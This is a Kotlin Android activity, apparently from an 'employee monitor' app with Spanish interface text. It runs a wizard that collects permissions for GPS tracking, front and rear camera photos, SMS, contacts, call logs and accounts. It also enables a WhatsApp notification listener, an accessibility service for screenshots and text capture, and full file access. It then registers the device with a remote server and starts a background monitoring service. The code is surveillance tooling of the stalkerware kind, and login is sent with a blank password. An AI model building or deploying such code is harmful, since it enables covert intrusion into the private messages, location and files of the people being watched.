package com.empresa.monitor.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.empresa.monitor.BuildConfig
import com.empresa.monitor.R
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.local.PreferencesManager
import com.empresa.monitor.data.model.DeviceRegisterRequest
import com.empresa.monitor.data.repository.MonitorRepository
import com.empresa.monitor.service.MonitorForegroundService
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    @Inject lateinit var prefs: PreferencesManager
    @Inject lateinit var repository: MonitorRepository

    private lateinit var etApiUrl: EditText
    private lateinit var etEmail: EditText
    private lateinit var etPassword: EditText
    private lateinit var etEmployeeName: EditText
    private lateinit var etEmployeeDept: EditText
    private lateinit var tvStatus: TextView
    private lateinit var tvPermStatus: TextView
    private lateinit var tvSpecPerms: TextView
    private lateinit var tvWizard: TextView
    private lateinit var btnStart: Button
    private lateinit var btnStop: Button
    private lateinit var btnWizardNext: Button

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wizardIndex = -1 // -1 = wizard not started

    // Step definitions: title, explanation, action
    private val wizardSteps = listOf(
        WizardStep("📍 Ubicación", "Para rastrear GPS en tiempo real", { openAppSettings() }),
        WizardStep("📷 Cámara", "Para tomar fotos frontal/trasera", { openAppSettings() }),
        WizardStep("👤 Contactos", "Para leer lista de contactos", { openAppSettings() }),
        WizardStep("💬 SMS", "Para leer mensajes SMS", { openAppSettings() }),
        WizardStep("📅 Calendario + Cuentas", "Para eventos y cuentas de correo", { openAppSettings() }),
        WizardStep("📞 Llamadas + Teléfono", "Para registro de llamadas", { openAppSettings() }),
        WizardStep("🔔 Notificaciones", "Para capturar notificaciones", { openAppSettings() }),
        WizardStep("📊 Acceso de uso", "Para monitorear apps abiertas", { openIntent(Settings.ACTION_USAGE_ACCESS_SETTINGS) }),
        WizardStep("🔔 Acceso notificaciones", "Para capturar WhatsApp, SMS, etc.", { openIntent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS) }),
        WizardStep("♿ Accesibilidad", "Para capturar texto y screenshots", { openIntent(Settings.ACTION_ACCESSIBILITY_SETTINGS) }),
        WizardStep("📦 Almacenamiento total", "Para acceder a todos los archivos", { openIntent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION) }),
    )

    data class WizardStep(val title: String, val desc: String, val action: () -> Unit)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etApiUrl = findViewById(R.id.etApiUrl)
        etEmail = findViewById(R.id.etEmail)
        etPassword = findViewById(R.id.etPassword)
        etEmployeeName = findViewById(R.id.etEmployeeName)
        etEmployeeDept = findViewById(R.id.etEmployeeDept)
        tvStatus = findViewById(R.id.tvStatus)
        tvPermStatus = findViewById(R.id.tvPermStatus)
        tvSpecPerms = findViewById(R.id.tvSpecPerms)
        tvWizard = findViewById(R.id.tvWizard)
        btnStart = findViewById(R.id.btnStart)
        btnStop = findViewById(R.id.btnStop)
        btnWizardNext = findViewById(R.id.btnWizardNext)

        loadSettings()
        setupButtons()
        updateStatus()
        updatePermStatus()

        prefs.authToken?.let { ApiClient.setToken(it) }
    }

    override fun onResume() {
        super.onResume()
        // Auto-check permissions when returning from settings
        updatePermStatus()
        if (wizardIndex >= 0) autoAdvanceWizard()
    }

    private fun setupButtons() {
        findViewById<Button>(R.id.btnSave).setOnClickListener { saveSettings() }
        btnStart.setOnClickListener { startMonitoring() }
        btnStop.setOnClickListener { stopMonitoring() }
        findViewById<Button>(R.id.btnPermissions).setOnClickListener { startWizard() }
        btnWizardNext.setOnClickListener { doWizardStep() }
    }

    private fun loadSettings() {
        etApiUrl.setText(prefs.apiUrl ?: BuildConfig.API_BASE_URL)
        etEmployeeName.setText(prefs.employeeName ?: "")
        etEmployeeDept.setText(prefs.employeeDepartment ?: "")
        etEmail.setText(prefs.lastEmail ?: "admin@monitor.com")
        etPassword.setText("")
    }

    private fun saveSettings() {
        prefs.apiUrl = etApiUrl.text.toString()
        prefs.employeeName = etEmployeeName.text.toString()
        prefs.employeeDepartment = etEmployeeDept.text.toString()
        prefs.lastEmail = etEmail.text.toString()
        Toast.makeText(this, "Configuración guardada ✅", Toast.LENGTH_SHORT).show()
    }

    // ─── PERMISSION WIZARD ───────────────────────
    private fun startWizard() {
        wizardIndex = 0
        tvWizard.visibility = android.view.View.VISIBLE
        btnWizardNext.visibility = android.view.View.VISIBLE
        showWizardStep()
    }

    private fun showWizardStep() {
        if (wizardIndex >= wizardSteps.size) {
            finishWizard()
            return
        }
        val step = wizardSteps[wizardIndex]
        tvWizard.text = "📋 Paso ${wizardIndex+1} de ${wizardSteps.size}: ${step.title}\n${step.desc}"
        btnWizardNext.text = "▶ Ir a configuración"
    }

    private fun doWizardStep() {
        if (wizardIndex < 0 || wizardIndex >= wizardSteps.size) return
        val step = wizardSteps[wizardIndex]
        step.action()
    }

    private fun autoAdvanceWizard() {
        if (wizardIndex < 0 || wizardIndex >= wizardSteps.size) return
        val step = wizardSteps[wizardIndex]
        // Check if the current step's permission is now granted
        if (isStepCompleted(wizardIndex)) {
            wizardIndex++
            if (wizardIndex >= wizardSteps.size) {
                finishWizard()
            } else {
                tvWizard.text = "✅ ${step.title} concedido!\nSiguiente: ${wizardSteps[wizardIndex].title}"
                btnWizardNext.text = "▶ Ir a ${wizardSteps[wizardIndex].title}"
            }
        }
    }

    private fun isStepCompleted(index: Int): Boolean {
        return when (index) {
            0 -> hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)
            1 -> hasPerm(Manifest.permission.CAMERA)
            2 -> hasPerm(Manifest.permission.READ_CONTACTS)
            3 -> hasPerm(Manifest.permission.READ_SMS)
            4 -> hasPerm(Manifest.permission.READ_CALENDAR) || hasPerm(Manifest.permission.GET_ACCOUNTS)
            5 -> hasPerm(Manifest.permission.READ_CALL_LOG)
            6 -> hasPerm(Manifest.permission.POST_NOTIFICATIONS)
            7 -> checkUsageAccessEnabled()
            8 -> checkNotificationListenerEnabled()
            9 -> checkAccessibilityEnabled()
            10 -> checkStorageManaged()
            else -> true
        }
    }

    private fun hasPerm(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
    }

    private fun finishWizard() {
        wizardIndex = -1
        tvWizard.text = "✅ Todos los permisos configurados!"
        btnWizardNext.visibility = android.view.View.GONE
        updatePermStatus()
        Toast.makeText(this, "✅ Permisos completos. Ahora toca INICIAR", Toast.LENGTH_LONG).show()
    }

    private fun openAppSettings() {
        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        })
    }

    private fun openIntent(action: String) {
        try { startActivity(Intent(action)) } catch (_: Exception) {}
    }

    // ─── PERMISSION CHECKS ───────────────────────
    private fun updatePermStatus() {
        tvPermStatus.text = buildString {
            append(if (hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)) "✅ Ubicación" else "❌ Ubicación")
            append(" · ")
            append(if (hasPerm(Manifest.permission.CAMERA)) "✅ Cámara" else "❌ Cámara")
            append(" · ")
            append(if (hasPerm(Manifest.permission.READ_CALL_LOG)) "✅ Llamadas" else "❌ Llamadas")
            append(" · ")
            append(if (hasPerm(Manifest.permission.POST_NOTIFICATIONS)) "✅ Notificaciones" else "❌ Notificaciones")
            append("\n")
            append(if (hasPerm(Manifest.permission.READ_CONTACTS)) "✅ Contactos" else "❌ Contactos")
            append(" · ")
            append(if (hasPerm(Manifest.permission.READ_SMS)) "✅ SMS" else "❌ SMS")
            append(" · ")
            append(if (hasPerm(Manifest.permission.READ_CALENDAR)) "✅ Calendario" else "❌ Calendario")
            append(" · ")
            append(if (hasPerm(Manifest.permission.GET_ACCOUNTS)) "✅ Cuentas" else "❌ Cuentas")
        }

        tvSpecPerms.text = buildString {
            append(if (checkAccessibilityEnabled()) "✅ Accesibilidad" else "❌ Accesibilidad")
            append(" · ")
            append(if (checkNotificationListenerEnabled()) "✅ Notif.Listener" else "❌ Notif.Listener")
            append(" · ")
            append(if (checkUsageAccessEnabled()) "✅ Uso de apps" else "❌ Uso de apps")
            append("\n")
            append(if (checkStorageManaged()) "✅ Almacenamiento" else "❌ Almacenamiento")
        }
    }

    private fun checkStorageManaged(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
            android.os.Environment.isExternalStorageManager() else true
    }

    private fun checkAccessibilityEnabled(): Boolean {
        return try {
            val svc = "$packageName/.service.screenshot.MonitorAccessibilityService"
            Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)?.contains(svc) == true
        } catch (_: Exception) { false }
    }

    private fun checkNotificationListenerEnabled(): Boolean {
        return try {
            val svc = "$packageName/.service.whatsapp.WhatsAppNotificationListener"
            Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(svc) == true
        } catch (_: Exception) { false }
    }

    private fun checkUsageAccessEnabled(): Boolean {
        return try {
            val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
            appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), packageName) == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }
    }

    // ─── MONITORING ──────────────────────────────
    private fun updateStatus() {
        val isRunning = prefs.isMonitoring
        tvStatus.text = if (isRunning) "🟢 Monitoreo activo" else "🔴 Inactivo"
        btnStart.isEnabled = !isRunning
        btnStop.isEnabled = isRunning
    }

    private fun startMonitoring() {
        val basicPerms = listOf(
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.CAMERA,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.POST_NOTIFICATIONS, Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS, Manifest.permission.READ_CALENDAR,
        )
        val allGranted = basicPerms.all { hasPerm(it) }
        if (!allGranted) {
            Toast.makeText(this, "Primero completa todos los permisos (tocá SOLICITAR PERMISOS)", Toast.LENGTH_LONG).show()
            return
        }

        val email = etEmail.text.toString()
        if (email.isBlank()) { Toast.makeText(this, "Ingresa el email", Toast.LENGTH_SHORT).show(); return }

        scope.launch {
            try {
                val login = repository.login(email, "")
                if (login.isFailure) {
                    withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Login falló", Toast.LENGTH_LONG).show() }; return@launch
                }
                val devId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
                repository.registerDevice(DeviceRegisterRequest(
                    deviceName = "${Build.MANUFACTURER} ${Build.MODEL}",
                    deviceModel = Build.MODEL, androidVersion = "${Build.VERSION.SDK_INT}",
                    deviceId = devId, employeeName = prefs.employeeName,
                    employeeDepartment = prefs.employeeDepartment,
                ))
                withContext(Dispatchers.Main) {
                    prefs.isMonitoring = true
                    startForegroundService(Intent(this@MainActivity, MonitorForegroundService::class.java).apply {
                        action = MonitorForegroundService.ACTION_START
                    })
                    updateStatus()
                    Toast.makeText(this@MainActivity, "Monitoreo iniciado ✅", Toast.LENGTH_SHORT).show()
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show() }
            }
        }
    }

    private fun stopMonitoring() {
        startService(Intent(this, MonitorForegroundService::class.java).apply {
            action = MonitorForegroundService.ACTION_STOP
        })
        prefs.isMonitoring = false
        updateStatus()
    }

    override fun onDestroy() { scope.cancel(); super.onDestroy() }
}
